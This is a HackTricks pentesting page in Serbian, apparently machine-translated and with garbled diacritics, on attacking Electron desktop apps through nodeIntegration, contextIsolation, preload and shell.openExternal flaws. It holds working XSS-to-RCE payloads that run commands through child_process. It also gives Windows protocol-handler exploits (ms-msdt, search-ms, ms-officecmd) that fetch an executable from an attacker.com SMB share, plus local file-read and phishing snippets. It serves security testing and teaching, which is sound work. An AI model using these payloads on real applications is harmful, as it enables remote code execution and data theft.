# Electron Aplikacije za Desktop

<details>

<summary><strong>Nau캜ite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi na캜ini podr코ke HackTricks-u:

* Ako 쬰lite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili da **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvani캜ni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**Porodicu PEASS**](https://opensea.io/collection/the-peass-family), na코u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 游냕 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

## Uvod

Electron kombinuje lokalni backend (sa **NodeJS**) i frontend (**Chromium**), iako mu nedostaju neki sigurnosni mehanizmi modernih pretra쬴va캜a.

Obi캜no mo쬰te prona캖i kod elektronske aplikacije unutar `.asar` aplikacije, kako biste dobili kod, morate ga izvu캖i:
```bash
npx asar extract app.asar destfolder #Extract everything
npx asar extract-file app.asar main.js #Extract just a file
```
U izvornom kodu Electron aplikacije, unutar `packet.json`, mo쬰te prona캖i specificiran `main.js` fajl gde su postavljene sigurnosne konfiguracije.
```json
{
"name": "standard-notes",
"main": "./app/index.js",
```
Electron ima 2 tipa procesa:

* Glavni proces (ima potpuni pristup NodeJS-u)
* Proces renderer-a (treba imati ograni캜en pristup NodeJS-u iz sigurnosnih razloga)

![](<../../../.gitbook/assets/image (179).png>)

**Proces renderer-a** 캖e biti prozor pregleda캜a koji u캜itava datoteku:
```javascript
const {BrowserWindow} = require('electron');
let win = new BrowserWindow();

//Open Renderer Process
win.loadURL(`file://path/to/index.html`);
```
Postavke **renderer procesa** mogu se **konfigurisati** u **glavnom procesu** unutar main.js datoteke. Neke od konfiguracija 캖e **sprije캜iti Electron aplikaciju da bude izlo쬰na RCE** ili drugim ranjivostima ako su **postavke pravilno konfigurisane**.

Elektronska aplikacija **mo쬰 pristupiti ure캠aju** putem Node API-ja iako se mo쬰 konfigurisati da to sprije캜i:

* **`nodeIntegration`** - je podrazumijevano isklju캜en. Ako je uklju캜en, omogu캖ava pristup node funkcijama iz renderer procesa.
* **`contextIsolation`** - je podrazumijevano uklju캜en. Ako je isklju캜en, glavni i renderer procesi nisu izolovani.
* **`preload`** - podrazumijevano prazno.
* [**`sandbox`**](https://docs.w3cub.com/electron/api/sandbox-option) - je podrazumijevano isklju캜en. Ograni캜ava akcije koje NodeJS mo쬰 izvr코iti.
* Node Integracija u Radnicima
* **`nodeIntegrationInSubframes`** - je podrazumijevano isklju캜en.
* Ako je **`nodeIntegration`** **omogu캖en**, to bi omogu캖ilo kori코캖enje **Node.js API-ja** na web stranicama koje se **u캜itavaju u iframe-ovima** unutar Electron aplikacije.
* Ako je **`nodeIntegration`** **onemogu캖en**, tada 캖e se prethodno u캜itati u iframe-u.

Primer konfiguracije:
```javascript
const mainWindowOptions = {
title: 'Discord',
backgroundColor: getBackgroundColor(),
width: DEFAULT_WIDTH,
height: DEFAULT_HEIGHT,
minWidth: MIN_WIDTH,
minHeight: MIN_HEIGHT,
transparent: false,
frame: false,
resizable: true,
show: isVisible,
webPreferences: {
blinkFeatures: 'EnumerateDevices,AudioOutputDevices',
nodeIntegration: false,
contextIsolation: false,
sandbox: false,
nodeIntegrationInSubFrames: false,
preload: _path2.default.join(__dirname, 'mainScreenPreload.js'),
nativeWindowOpen: true,
enableRemoteModule: false,
spellcheck: true
}
};
```
Neki **RCE payloadi** sa [ovde](https://7as.es/electron/nodeIntegration\_rce.txt):
```html
Example Payloads (Windows):
<img src=x onerror="alert(require('child_process').execSync('calc').toString());">

Example Payloads (Linux & MacOS):
<img src=x onerror="alert(require('child_process').execSync('gnome-calculator').toString());">
<img src=x onerror="alert(require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator').toString());">
<img src=x onerror="alert(require('child_process').execSync('id').toString());">
<img src=x onerror="alert(require('child_process').execSync('ls -l').toString());">
<img src=x onerror="alert(require('child_process').execSync('uname -a').toString());">
```
### Snimanje saobra캖aja

Izmenite konfiguraciju start-main i dodajte kori코캖enje proxy-ja kao 코to je:
```javascript
"start-main": "electron ./dist/main/main.js --proxy-server=127.0.0.1:8080 --ignore-certificateerrors",
```
## Elektronska lokalna ubacivanje koda

Ako mo쬰te lokalno izvr코iti Elektron aplikaciju, mogu캖e je da mo쬰te naterati da izvr코i proizvoljan JavaScript kod. Proverite kako u:

{% content-ref url="../../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-electron-applications-injection.md" %}
[macos-electron-applications-injection.md](../../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-electron-applications-injection.md)
{% endcontent-ref %}

## RCE: XSS + nodeIntegration

Ako je **nodeIntegration** pode코en na **on**, JavaScript veb stranice mogu lako koristiti Node.js funkcije jednostavno pozivaju캖i `require()`. Na primer, na캜in za izvr코avanje kalkulatora na Windows-u je:
```html
<script>
require('child_process').exec('calc');
// or
top.require('child_process').exec('open /System/Applications/Calculator.app');
</script>
```
<figure><img src="../../../.gitbook/assets/image (1107).png" alt=""><figcaption></figcaption></figure>

## RCE: preload

Skripta nazna캜ena u ovom pode코avanju se **u캜itava pre drugih skripti u rendereru**, tako da ima **neograni캜en pristup Node API-ima**:
```javascript
new BrowserWindow{
webPreferences: {
nodeIntegration: false,
preload: _path2.default.join(__dirname, 'perload.js'),
}
});
```
Dakle, skripta mo쬰 izvoziti node-features na stranice:

{% code title="preload.js" %}
```javascript
typeof require === 'function';
window.runCalc = function(){
require('child_process').exec('calc')
};
```
{% endcode %}

{% code title="index.html" %}
```html
<body>
<script>
typeof require === 'undefined';
runCalc();
</script>
</body>
```
{% endcode %}

{% hint style="info" %}
**Ako je `contextIsolation` uklju캜en, ovo ne캖e raditi**
{% endhint %}

## RCE: XSS + contextIsolation

_**contextIsolation**_ uvodi **odvojene kontekste izme캠u skripti veb stranica i unutra코njeg koda JavaScript-a Elektron** tako da izvr코avanje JavaScript-a svakog koda ne uti캜e jedan na drugi. Ovo je neophodna funkcija za eliminisanje mogu캖nosti RCE.

Ako konteksti nisu izolovani, napada캜 mo쬰:

1. Izvr코iti **proizvoljan JavaScript u rendereru** (XSS ili navigacija ka spoljnim sajtovima)
2. **Prepisati ugra캠enu metodu** koja se koristi u preload ili unutra코njem kodu Elektrona u sopstvenu funkciju
3. **Pokrenuti** kori코캖enje **prepisane funkcije**
4. RCE?

Postoje 2 mesta gde se ugra캠ene metode mogu prepisati: U preload kodu ili u unutra코njem kodu Elektrona:

{% content-ref url="electron-contextisolation-rce-via-preload-code.md" %}
[electron-contextisolation-rce-via-preload-code.md](electron-contextisolation-rce-via-preload-code.md)
{% endcontent-ref %}

{% content-ref url="electron-contextisolation-rce-via-electron-internal-code.md" %}
[electron-contextisolation-rce-via-electron-internal-code.md](electron-contextisolation-rce-via-electron-internal-code.md)
{% endcontent-ref %}

{% content-ref url="electron-contextisolation-rce-via-ipc.md" %}
[electron-contextisolation-rce-via-ipc.md](electron-contextisolation-rce-via-ipc.md)
{% endcontent-ref %}

### Bypass click event

Ako su primenjena ograni캜enja prilikom klika na link, mo쬯a 캖ete mo캖i da ih zaobi캠ete **prave캖i srednji klik** umesto redovnog levog klika
```javascript
window.addEventListener('click', (e) => {
```
## RCE putem shell.openExternal

Za vi코e informacija o ovim primerima pogledajte [https://shabarkin.medium.com/1-click-rce-in-electron-applications-79b52e1fe8b8](https://shabarkin.medium.com/1-click-rce-in-electron-applications-79b52e1fe8b8) i [https://benjamin-altpeter.de/shell-openexternal-dangers/](https://benjamin-altpeter.de/shell-openexternal-dangers/)

Prilikom implementacije Electron desktop aplikacije, va쬹o je osigurati ispravne postavke za `nodeIntegration` i `contextIsolation`. Utvr캠eno je da se **udaljeno izvr코avanje koda na klijentskoj strani (RCE)** koje cilja preload skripte ili Electron-ov nativni kod iz glavnog procesa efikasno spre캜ava kada su ove postavke pode코ene. 

Kada korisnik interaguje sa linkovima ili otvara nove prozore, specifi캜ni event listeneri se aktiviraju, 코to je klju캜no za sigurnost i funkcionalnost aplikacije:
```javascript
webContents.on("new-window", function (event, url, disposition, options) {}
webContents.on("will-navigate", function (event, url) {}
```
Ovi slu코aoci **su preklopljeni od strane desktop aplikacije** kako bi implementirali svoju **poslovnu logiku**. Aplikacija procenjuje da li bi navigirani link trebalo da se otvori interno ili u eksternom web pregleda캜u. Ova odluka se obi캜no donosi kroz funkciju, `openInternally`. Ako ova funkcija vrati `false`, to ukazuje da bi link trebalo otvoriti eksterno, koriste캖i funkciju `shell.openExternal`.

**Evo pojednostavljenog pseudokoda:**

![https://miro.medium.com/max/1400/1\*iqX26DMEr9RF7nMC1ANMAA.png](<../../../.gitbook/assets/image (258).png>)

![https://miro.medium.com/max/1400/1\*ZfgVwT3X1V\_UfjcKaAccag.png](<../../../.gitbook/assets/image (960).png>)

Najbolje prakse za bezbednost u Electron JS savetuju da se ne prihvata nepoveren sadr쬬j sa funkcijom `openExternal`, jer to mo쬰 dovesti do RCE putem razli캜itih protokola. Operativni sistemi podr쬬vaju razli캜ite protokole koji mogu pokrenuti RCE. Za detaljne primere i dalje obja코njenje o ovoj temi, mo쬰te se obratiti [ovom resursu](https://positive.security/blog/url-open-rce#windows-10-19042), koji uklju캜uje primere Windows protokola koji su sposobni da iskoriste ovu ranjivost.

**Primeri eksploatacije Windows protokola uklju캜uju:**
```html
<script>
window.open("ms-msdt:id%20PCWDiagnostic%20%2Fmoreoptions%20false%20%2Fskip%20true%20%2Fparam%20IT_BrowseForFile%3D%22%5Cattacker.comsmb_sharemalicious_executable.exe%22%20%2Fparam%20IT_SelectProgram%3D%22NotListed%22%20%2Fparam%20IT_AutoTroubleshoot%3D%22ts_AUTO%22")
</script>

<script>
window.open("search-ms:query=malicious_executable.exe&crumb=location:%5C%5Cattacker.com%5Csmb_share%5Ctools&displayname=Important%20update")
</script>

<script>
window.open("ms-officecmd:%7B%22id%22:3,%22LocalProviders.LaunchOfficeAppForResult%22:%7B%22details%22:%7B%22appId%22:5,%22name%22:%22Teams%22,%22discovered%22:%7B%22command%22:%22teams.exe%22,%22uri%22:%22msteams%22%7D%7D,%22filename%22:%22a:/b/%2520--disable-gpu-sandbox%2520--gpu-launcher=%22C:%5CWindows%5CSystem32%5Ccmd%2520/c%2520ping%252016843009%2520&&%2520%22%22%7D%7D")
</script>
```
## 캛itanje internih fajlova: XSS + contextIsolation

**Onemogu캖avanje `contextIsolation` omogu캖ava kori코캖enje `<webview>` oznaka**, sli캜no kao `<iframe>`, za 캜itanje i eksfiltraciju lokalnih fajlova. Primer prikazuje kako iskoristiti ovu ranjivost za 캜itanje sadr쬬ja internih fajlova:

![](<../../../.gitbook/assets/1 u1jdRYuWAEVwJmf_F2ttJg (1).png>)

Tako캠e, deli se jo코 jedan metod za **캜itanje internog fajla**, isti캜u캖i kriti캜nu ranjivost 캜itanja lokalnih fajlova u Electron desktop aplikaciji. To uklju캜uje ubacivanje skripte za iskori코캖avanje aplikacije i eksfiltraciju podataka:
```html
<br><BR><BR><BR>
<h1>pwn<br>
<iframe onload=j() src="/etc/hosts">xssxsxxsxs</iframe>
<script type="text/javascript">
function j(){alert('pwned contents of /etc/hosts :\n\n '+frames[0].document.body.innerText)}
</script>
```
## **RCE: XSS + Stari Chromium**

Ako je **chromium** koji koristi aplikacija **zastareo** i postoje **poznate ranjivosti** na njemu, mogu캖e je **iskoristiti ih i dobiti RCE putem XSS**.\
Mo쬰te videti primer u ovom **izve코taju**: [https://blog.electrovolt.io/posts/discord-rce/](https://blog.electrovolt.io/posts/discord-rce/)

## **XSS Ribarenje putem Internog URL regex zaobila쬰nja**

Pretpostavimo da ste prona코li XSS ali **ne mo쬰te pokrenuti RCE ili ukrasti interne datoteke**, mo쬰te poku코ati da ga iskoristite za **ukradete pristupne podatke putem ribarenja**.

Prvo treba da znate 코ta se de코ava kada poku코ate da otvorite novi URL, proveravaju캖i JS kod u front-endu:
```javascript
webContents.on("new-window", function (event, url, disposition, options) {} // opens the custom openInternally function (it is declared below)
webContents.on("will-navigate", function (event, url) {}                    // opens the custom openInternally function (it is declared below)
```
Poziv **`openInternally`** 캖e odlu캜iti da li 캖e se **link** otvoriti u **prozoru desktop aplikacije** kao link koji pripada platformi, **ili** 캖e se otvoriti u **browseru kao resurs tre캖e strane**.

U slu캜aju da je **regex** koji koristi funkcija **ranjiv na obilaske** (na primer, **ne be쬴 ta캜ke poddomena**), napada캜 bi mogao zloupotrebiti XSS da **otvori novi prozor koji** 캖e se nalaziti na infrastrukturi napada캜a **tra쬰캖i od korisnika pristupne podatke**:
```html
<script>
window.open("<http://subdomainagoogleq.com/index.html>")
</script>
```
## **Alati**

* [**Electronegativity**](https://github.com/doyensec/electronegativity) je alat za identifikaciju lo코e konfigurisanih segmenata i sigurnosnih anti-uzoraka u aplikacijama zasnovanim na Electron-u.
* [**Electrolint**](https://github.com/ksdmitrieva/electrolint) je otvoreni VS Code dodatak za Electron aplikacije koji koristi Electronegativity.
* [**nodejsscan**](https://github.com/ajinabraham/nodejsscan) za proveru ranjivih biblioteka tre캖ih strana
* [**Electro.ng**](https://electro.ng/): Morate ga kupiti

## Laboratorije

Na [https://www.youtube.com/watch?v=xILfQGkLXQo\&t=22s](https://www.youtube.com/watch?v=xILfQGkLXQo\&t=22s) mo쬰te prona캖i laboratoriju za iskori코캖avanje ranjivih Electron aplikacija.

Neki korisni komandi za rad u laboratoriji:
```bash
# Download apps from these URls
# Vuln to nodeIntegration
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable1.zip
# Vuln to contextIsolation via preload script
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable2.zip
# Vuln to IPC Rce
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable3.zip

# Get inside the electron app and check for vulnerabilities
npm audit

# How to use electronegativity
npm install @doyensec/electronegativity -g
electronegativity -i vulnerable1

# Run an application from source code
npm install -g electron
cd vulnerable1
npm install
npm start
```
## **Reference**

* [https://shabarkin.medium.com/unsafe-content-loading-electron-js-76296b6ac028](https://shabarkin.medium.com/unsafe-content-loading-electron-js-76296b6ac028)
* [https://medium.com/@renwa/facebook-messenger-desktop-app-arbitrary-file-read-db2374550f6d](https://medium.com/@renwa/facebook-messenger-desktop-app-arbitrary-file-read-db2374550f6d)
* [https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=8](https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=8)
* [https://www.youtube.com/watch?v=a-YnG3Mx-Tg](https://www.youtube.com/watch?v=a-YnG3Mx-Tg)
* [https://www.youtube.com/watch?v=xILfQGkLXQo\&t=22s](https://www.youtube.com/watch?v=xILfQGkLXQo\&t=22s)
* Vi코e istra쬴vanja i tekstova o sigurnosti Elektron aplikacija mo쬰te prona캖i na [https://github.com/doyensec/awesome-electronjs-hacking](https://github.com/doyensec/awesome-electronjs-hacking)
* [https://www.youtube.com/watch?v=Tzo8ucHA5xw\&list=PLH15HpR5qRsVKcKwvIl-AzGfRqKyx--zq\&index=81](https://www.youtube.com/watch?v=Tzo8ucHA5xw\&list=PLH15HpR5qRsVKcKwvIl-AzGfRqKyx--zq\&index=81)

<details>

<summary><strong>Nau캜ite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi na캜ini podr코ke HackTricks-u:

* Ako 쬰lite da vidite **va코u kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvani캜ni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), na코u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 游냕 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
